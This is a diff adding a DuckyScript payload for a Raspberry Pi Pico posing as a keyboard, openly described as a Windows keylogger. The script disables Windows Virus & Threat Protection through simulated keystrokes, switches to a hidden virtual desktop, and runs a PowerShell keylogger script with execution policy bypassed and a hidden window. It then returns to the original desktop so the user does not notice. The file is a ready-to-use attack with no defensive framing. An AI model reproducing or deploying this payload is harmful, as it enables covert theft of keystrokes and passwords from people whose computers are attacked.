@@ -1,0 +1,58 @@
+REM Windows Keylogger using Raspberry Pi Pico 2 (no external storage)
+REM Disables Windows protection
+REM Logs save to keylogs.txt on Pico's internal CIRCUITPY drive.
+REM To stop: Eject Pico or delete keylogs.txt via setup mode.
+
+DELAY 4000
+
+REM Disable Virus & Threat Protection
+CONTROL ESCAPE
+DELAY 1000
+STRING virus protection
+DELAY 2000
+ENTER
+DELAY 3000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 2000
+TAB
+DELAY 1500
+ENTER
+DELAY 1500
+SPACE
+DELAY 1500
+LEFT
+DELAY 1500
+ENTER
+DELAY 1000
+ALT F4
+
+REM Open hidden desktop
+DELAY 1000
+GUI TAB
+DELAY 800
+TAB
+DELAY 700
+RIGHT
+DELAY 700
+ENTER
+DELAY 700
+ESCAPE
+
+REM Find CIRCUITPY and run script
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -ep bypass -WindowStyle Hidden -File D:/keylogger.ps1
+ENTER
+
+REM Open original desktop
+DELAY 1000
+GUI TAB
+DELAY 700
+TAB
+DELAY 700
+ENTER
